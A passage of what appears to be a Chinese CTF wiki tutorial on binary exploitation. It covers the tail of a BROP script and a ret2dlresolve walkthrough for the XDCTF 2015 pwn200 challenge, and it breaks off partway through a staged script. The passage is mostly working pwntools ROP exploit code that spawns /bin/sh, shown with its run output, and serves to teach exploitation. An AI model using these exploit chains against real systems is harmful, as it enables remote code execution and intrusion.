stop_gadget <span class="token operator">=</span> <span class="token number">0x4006b6</span>
<span class="token comment" spellcheck="true">##brop_gadget = find_brop_gadget(length,stop_gadget)</span>
brop_gadget <span class="token operator">=</span> <span class="token number">0x4007ba</span>
rdi_ret <span class="token operator">=</span> brop_gadget <span class="token operator">+</span> <span class="token number">9</span>
<span class="token comment" spellcheck="true">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span>
puts_plt <span class="token operator">=</span> <span class="token number">0x400560</span>
<span class="token comment" spellcheck="true">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span>
puts_got <span class="token operator">=</span> <span class="token number">0x601018</span>

sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
    stop_gadget<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
data <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nWelCome'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
    system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stop_gadget<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。读者可以参考 executable 部分  ELF 对应的介绍。这里只给出相应的利用方式。</p>
<h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。</p>
<p>具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p>
<h3 id="思路1-直接控制重定位表项的相关内容"><a href="#思路1-直接控制重定位表项的相关内容" class="headerlink" title="思路1 - 直接控制重定位表项的相关内容"></a>思路1 - 直接控制重定位表项的相关内容</h3><p>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 <code>.dynstr</code>，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p>
<p>但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。</p>
<h3 id="思路2-间接控制重定位表项的相关内容"><a href="#思路2-间接控制重定位表项的相关内容" class="headerlink" title="思路2 - 间接控制重定位表项的相关内容"></a>思路2 - 间接控制重定位表项的相关内容</h3><p>既然动态链接器会从 <code>.dynamic</code> 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。</p>
<h3 id="思路3-伪造-link-map"><a href="#思路3-伪造-link-map" class="headerlink" title="思路3 - 伪造 link_map"></a>思路3 - 伪造 link_map</h3><p>由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p>
<p>下面我们以 2015-XDCTF-pwn200 来介绍 32 位和 64 位下如何使用 ret2dlresolve 技巧。</p>
<h2 id="32-位例子"><a href="#32-位例子" class="headerlink" title="32 位例子"></a>32 位例子</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>首先，我们可以按照下面的方式来编译对应的文件。</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
❯ checksec main_no_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这种情况下，修改 <code>.dynamic</code> 会简单些。因为我们只需要修改 <code>.dynamic</code> 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下</p>
<ol>
<li>修改 .dynamic 节中字符串表的地址为伪造的地址</li>
<li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li>
<li>在特定的位置读取 /bin/sh 字符串。</li>
<li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而执行 system 函数。</li>
</ol>
<p>代码如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"i386"</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_no_relro_32"</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_32"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_no_relro_32"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">112</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x08049804</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># modify .dynstr pointer in .dynamic section to a specific location</span>
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>
dynstr <span class="token operator">=</span> dynstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x080498E0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span><span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># construct a fake dynstr section</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x080498E0</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read /bin/sh\x00</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x08048376</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># the second instruction of read@plt </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x080498E0</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># print(rop.dump())</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x080498E0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行效果如下</p>
<pre><code>❯ python exp-no-relro.py
[+] Starting local process './main_no_relro_32': pid 35093
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_no_relro_32'
[*] Switching to interactive mode
$ ls
exp-no-relro.py  main_no_relro_32</code></pre><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>首先我们可以编译源文件 main.c 得到二进制文件，这里取消了 Canary 保护。</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32
❯ checksec main_partial_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti
al-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这种情况下，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。</p>
<p>在下面的讲解过程中，本文会按照以下两种不同的方式来使用该技巧。</p>
<ol>
<li>通过手工伪造的方式使用该技巧，从而获取 shell。这种方式虽然比较麻烦，但是可以仔细理解 ret2dlresolve 的原理。</li>
<li>利用工具来实现攻击，从而获取 shell。这种方式比较简单，但我们还是应该充分理解背后的原理，不能只是会使用工具。</li>
</ol>
<h4 id="手工伪造"><a href="#手工伪造" class="headerlink" title="手工伪造"></a>手工伪造</h4><p>这题我们不考虑有 libc 的情况。通过分析，我们可以发现程序有一个很明显的栈溢出漏洞，缓冲区到返回地址间的偏移为 112。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
Welcome to XDCTF2015~!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xc9
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffcddc  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x100
$esp   : 0xffffce50  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7fb0000  →  0x001d7d6c
$edi   : 0xffffcec0  →  0x00000001
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────── stack ────
0xffffce50│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"     ← $esp
0xffffce54│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffce58│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffce5c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffce60│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffce64│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffce68│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffce6c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
─────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
─────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main_partial_re", stopped 0x62616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────
0x62616164 in ?? ()
gef➤  pattern search 0x62616164
[+] Searching '0x62616164'
[+] Found at offset 112 (little-endian search) likely<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在下面的每一个阶段中，我们会一步步地深入理解如何构造 payload。</p>
<h5 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h5><p>在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步</p>
<ol>
<li>将栈迁移到 bss 段。</li>
<li>通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。</li>
</ol>
<p>这里使用了 pwntools 中的 ROP 模块。具体代码如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">112</span>
bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set esp = base_stage</span>
stack_size <span class="token operator">=</span> <span class="token number">0x800</span> <span class="token comment" spellcheck="true"># new stack size is 0x800</span>
base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> base_stage<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read 100 byte to base_stage</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># write "/bin/sh"</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>
rop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> base_stage <span class="token operator">+</span> <span class="token number">80</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python stage1.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25112
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h5><p>在这一阶段，我们将会进一步利用 <code>_dl_runtime_resolve</code> 相关的知识来控制程序执行 write 函数。</p>
<ol>
<li>将栈迁移到 bss 段。</li>
<li>控制程序直接执行 plt0 中的相关指令，即 push linkmap 以及跳转到 <code>_dl_runtime_resolve</code> 函数。这时，我们还需要提供  write 重定位项在 got 表中的偏移。这里，我们可以直接使用 write plt 中提供的偏移，即 0x080483C6 处所给出的 0x20。其实，我们也可以跳转到 0x080483C6 地址处，利用原有的指令来提供 write 函数的偏移，并跳转到 plt0。</li>
</ol>
<pre><code>.plt:08048370 ; ===========================================================================
.plt:08048370
.plt:08048370 ; Segment type: Pure code
.plt:08048370 ; Segment permissions: Read/Execute
.plt:08048370 _plt            segment para public 'CODE' use32
.plt:08048370                 assume cs:_plt
.plt:08048370                 ;org 8048370h
.plt:08048370                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.plt:08048370
.plt:08048370 ; =============== S U B R O U T I N E =======================================
.plt:08048370
.plt:08048370
.plt:08048370 sub_8048370     proc near               ; CODE XREF: .plt:0804838B↓j
.plt:08048370                                         ; .plt:0804839B↓j ...
.plt:08048370 ; __unwind {
.plt:08048370                 push    ds:dword_804A004
.plt:08048376                 jmp     ds:dword_804A008
.plt:08048376 sub_8048370     endp
.plt:08048376
...
.plt:080483C0 ; =============== S U B R O U T I N E =======================================
.plt:080483C0
.plt:080483C0 ; Attributes: thunk
.plt:080483C0
.plt:080483C0 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:080483C0 _write          proc near               ; CODE XREF: main+8A↓p
.plt:080483C0
.plt:080483C0 fd              = dword ptr  4
.plt:080483C0 buf             = dword ptr  8
.plt:080483C0 n               = dword ptr  0Ch
.plt:080483C0
.plt:080483C0                 jmp     ds:off_804A01C
.plt:080483C0 _write          endp
.plt:080483C0
.plt:080483C6 ; ---------------------------------------------------------------------------
.plt:080483C6                 push    20h ; ' '
.plt:080483CB                 jmp     sub_8048370</code></pre><p>具体代码如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">112</span>
bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set esp = base_stage</span>
stack_size <span class="token operator">=</span> <span class="token number">0x800</span> <span class="token comment" spellcheck="true"># new stack size is 0x800</span>
base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding</span>
rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> base_stage<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># read 100 byte to base_stage</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># write "/bin/sh"</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./main_partial_relro_32'</span><span class="token punctuation">)</span>
plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
jmprel_data <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>
writegot <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
write_reloc_offset <span class="token operator">=</span> jmprel_data<span class="token punctuation">.</span>find<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>writegot<span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">"little"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>write_reloc_offset<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>write_reloc_offset<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># fake ret addr of write</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># fake write args, write(1, base_stage+80, sh)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">80</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
